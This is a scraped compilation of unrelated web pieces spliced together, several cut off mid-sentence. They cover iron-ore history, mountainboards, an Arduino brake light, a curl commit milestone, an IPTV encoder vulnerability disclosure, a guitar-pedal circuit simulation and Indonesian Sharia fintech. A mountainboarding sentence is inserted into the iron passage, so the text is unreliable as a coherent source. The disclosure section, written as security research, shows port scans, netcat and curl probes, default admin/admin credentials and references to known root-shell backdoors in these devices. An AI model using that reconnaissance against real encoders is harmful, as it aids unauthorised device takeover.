<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>

<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth’s crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that’s the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let’s get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>” is an accurate description of where it comes from (there is also one known deposit of native ‘<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.</p>

<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)·<em>n</em>H<sub>2</sub>O) close behind.

This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet.

<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>

<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>

<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>

<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I’ve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,…) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting “port knocking” backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<p>Here is a few pictures of one of the devices I had an opportunity to test.

Let’s plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it’s enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a long time since I’ve done <a href="http://cushychicken.github.io/posts/ltspice-tube-screamer/">a pedal simulation</a>, and, well, quarantine times are as good a time as any to fill time with LTSpice simulation. Since Radiohead is a too-appropirate soundtrack for the time in which we live, and Thom Yorke is a famous user, why not simulate the ProCO RAT distortion pedal?</p><p>If you’d like to follow along at home, I’ve put <a href="https://github.com/Cushychicken/ltspice-guitar-pedals/tree/master/proco-rat-distortion">the LTSpice file on GitHub</a>. Find any errors? Got any neat mods you’d like to include? Please, submit a pull request!</p><p>You may need to rustle up a diode model for the 1N914 to run - it is not one of the models included in the LTSpice install.</p><p>Here’s the whole schematic, labeled for clarity:</p><p><img src="http://cushychicken.github.io/assets/images/proco_rat_whole_schematic" alt="Whole Schematic"></p><p>The interesting stuff is largely concentrated in the clipping, tone, and output stages.</p><p>The clipping stage is formed by a LM308 opamp in a noninverting configuration. R2 biases the input at 4.5[V] for maximum dynamic range in the opamp output - i.e., halfway between the 9V rail and GND. Feedback gain is set by potentiometer R9. When shorted to 0[ohm], it reduces the clipping stage to a simple opamp follower (gain=1). When set to a maximum, gain of the amp in signal bands is: \(Gain = 1 + \frac{Rgain}{(560 || 47)} = ~2300 [V/V] = ~67[dB]\) This is more than enough gain to drive to the opamp rail for even a gentle input signal. Fed raw into a guitar amplifier, this signal would completely saturate the input. That’s where the D2/D3 diode clipping pair come in to play. (Note, though, that the input saturation is desirable to some users. A common modification to this pedal is to remove D2/D3, and rely solely on opamp clipping. This yields a volume boost, and crunchier tone.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433482578.png" alt="Clipping Stage"></p><p>The AC coupling network of C10/R10 works to shift the signal back to a DC balanced square wave. D2/D3 serve to clip the signal down to a more modest +/-0.65[V].</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433524694.png" alt="Input vs Opamp Output vs Clipping Diodes"></p><p>This is slightly more interesting when you move into the frequency domain, however. The net effect, as the gain increases, is to emphasize the 1kHz band of the guitar - ideally, to cut through the mix of a band. (A rock band, that is - not a frequency band.)</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433598206.png" alt="Image"></p><p>Note that all of these traces converge to the same rolloff asymptote. That’s the limitation imposed by the LM308’s output slew rate. At higher gain, the opamp can’t switch any faster, which limits the response of higher frequencies as the gain increases.</p><p>The tone control is remarkably simple - just a first order RC filter, with potentiometer R17 to allow the user to set the rolloff frequency.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433644991.png" alt="Tone RC Filter"></p><p>R15 and C11 set a limit of the RC filter of the tone stage at about 32kHz. Increasing pot R17 moves that corner frequency lower and lower, until bottoming out at 475Hz. This filter effectively smooths the square wave into progressively softer edges. As R17 increases, the transitions get less square, and closer to a triangular wave.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433664315.png" alt="Image"></p><p>This is my estimate of who lies where on the tone curve, based on a subset of <a href="https://en.wikipedia.org/wiki/Pro_Co_RAT#Notable_users">Wikipedia’s list of RAT users</a>:</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433692230.png" alt="Clipping vs Users"></p><p>The output driver is also relatively simple - just a JFET follower, with a simple RC filter serving as a highpass filter for volume control. As R14 decreases in resistance, so does the output volume.</p><p><img src="http://cushychicken.github.io/assets/images/Image-1600433718430.png" alt="Image"></p><ul><li>Increasing the compensation capacitor of the LM308 opamp (C1 in our schematic) has some interesting properties. Increasing this to 300pF creates a softer transition to the opamp railing out, which yields an overall softer clip - fewer higher harmonics. An alternative design, for a less harsh clip.</li><li>Increasing the compensation cap higher proves problematic - or interesting, depending on your viewpoint. Increasing C1 to 3nF yields a gentle oscillation in the opamp output. This could make for some wacky mixed frequency effects. Might be a fun thing to wire up and see what happens.</li><li>Different diodes for D2/D3 could also change the clipping profile, and the harshness of the clip.</li></ul><p><a href="https://www.electrosmash.com/proco-rat">ElectroSmash</a>, of course, is the vanguard of guitar pedal EE knowhow. I used their page of schematics and simulation output as a sanity check that I got all of this right.</p><p>You can see the slew rate limitation of the LM308 in <a href="https://www.analog.com/media/en/technical-documentation/data-sheets/lt0108.pdf">the datasheet</a>. Gain/bandwidth product is on page 4, under “Open Loop Frequency Response”.</p></div></div>]]>

<p><span>T</span>he average fintech startup founder faces a taxing to-do list: raise seed funding, scope out a user base, recruit talent, build something people will actually use. For the Indonesian entrepreneur, the Muslim-majority market presents an additional hurdle: build an app that is compliant with Islamic religious law, or Sharia.</p>



<p>New fintech startups must present themselves before the Indonesian Ulema Council (Majelis Ulama Indonesia, or MUI, in Bahasa Indonesian), composed of religious clerics from across the archipelago, for Sharia certification, in order to reach Indonesia’s 220 million Muslim users, who generally seek out products that fit their faith.&nbsp;</p>



<p>MUI shapes much of Indonesian life. The body has <a href="https://www.vice.com/en_in/article/bjpwwm/indonesia-just-got-its-first-halal-fridge-heres-a-list-of-everything-else-that-needs-a-stamp">conducted halal audits on household products</a>, verifying that milk, moisturizer, and instant ramen meet strict religious criteria. Its <em>fatwa</em> commission also regularly intervenes in the moral life of Indonesians, promulgating headline-making rulings on <a href="https://www.rappler.com/world/regions/asia-pacific/indonesia/87440-bhimanto-suwastoyo-fatwa-homosexuality-indonesia-death-penalty">homosexuality</a> and <a href="https://academic.oup.com/jis/article-abstract/18/2/202/726927">secularism</a>. Since the late 1990s, when Indonesian politics began a turn toward Islamic conservatism, the council’s influence has grown, according to Syafiq Hasyim, a Jakarta-based scholar of MUI and the political economy.&nbsp;</p>



	




<p>Now MUI is using its policing power to shape a new sector of Indonesian society: consumer technology. In November 2019, Vice President Ma’ruf Amin declared the <a href="https://www.scmp.com/week-asia/economics/article/3044601/how-sharia-economy-shapes-democracy-indonesia">“Shariatization” of the economy</a> — i.e., the growth of digital financial services catering to Muslim users — a priority for the country’s development. Indonesian Muslim consumers currently spend $224 billion annually. When fintech companies build platforms for these users — whether peer-to-peer lending apps, mobile money services, or online stock-trading portals — MUI acts as the arbiter of their religious legitimacy. MUI’s National Sharia Council (Dewan Syariah Nasional, or DSN) issues certificates that verify platforms are compliant with Sharia. The chairman of DSN just happens to be the vice president himself.</p>



<p>To earn a certificate, new startups must adhere to the council’s combined 154 fatwas, a rule book for anyone attempting to build Sharia fintech. New fatwas are added every year on digital finance topics that now include commodities trading online and cryptocurrencies. In the certification process, MUI’s religious scholars become embedded in the early evolution of a company’s digital products, their background not in software engineering or UX design but the traditions and teachings of Islam.</p>

<p>In Sharia, for example, <a href="https://www.investopedia.com/terms/r/riba.asp#:~:text=Riba%20is%20prohibited%20under%20Shari,and%20helping%20others%20through%20kindness.">charging interest, or <em>riba</em></a><em>,</em> is strictly prohibited. Sharia promotes charitable financial dealings and labels interest and guaranteed profits inherently unjust. Instead of a conventional credit model, Sharia lending platforms operate according to <a href="https://www.sciencedirect.com/science/article/pii/S187705091931230X"><em>mudarabah</em></a>. Under this model, rather than a lender extracting a profit from a borrower, the borrower and lender enter a more equitable contract. For a small-business loan, for example, the lender receives a predetermined share of profits but must also share in the losses, since the borrower has invested labor and knowledge in the business. This model underpins a host of peer-to-peer lending apps targeting Muslim users in Indonesia.</p>



<p>For Sharia stock trading, MUI mandates, under <a href="https://drive.google.com/file/d/0BxTl-lNihFyzZUxIbkR3RXV4TWc/view">Fatwa No. 80</a>, that traders invest only in halal companies. Online stock trading platforms like MNC Trade Syariah vet all potential listings accordingly, removing any that deal in gambling, alcohol, or pork products.</p>



<p>For some companies, compliance is more of a challenge. Take LinkAja. <a href="https://kr-asia.com/linkaja-ceo-danu-wicaksana-ready-to-be-the-biggest-mobile-payment-platform-in-indonesia">Launched in June 2019</a> and currently serving 45 million registered users, it’s one of the country’s largest mobile money services <a href="https://www.thejakartapost.com/adv-longform/2019/12/27/why-gojek-users-leave-their-cash-behind-and-turn-to-gopay.html">behind leaders like GoJek’s digital wallet</a> GoPay and OVO. Customers can send, store, or receive electronic money on the LinkAja app. </p>



<p>Late last year, the company announced it was building the first Sharia mobile money product in Indonesia, a digital wallet for Muslim consumers to be called LinkAja Sharia Services. Standard LinkAja app users would be able to go into their settings and switch to a parallel platform built for Sharia compliance. But before they even created a prototype, LinkAja’s team knew they needed to consult MUI.</p>



<p>Most Islamic fintech companies have an appointed head of Sharia, a taskmaster who manages the compliance process. At LinkAja, that person is Widjayanto Djaenudin. While he had no experience in Sharia technology per se, he spent more than a decade at Telkomsel, Indonesia’s largest telecoms operator, developing mobile products for the unbanked. His task at LinkAja was to liaise with MUI and guide the company through its certification process, a challenge, considering the tenuous status of Sharia scholarship on mobile money apps. </p>



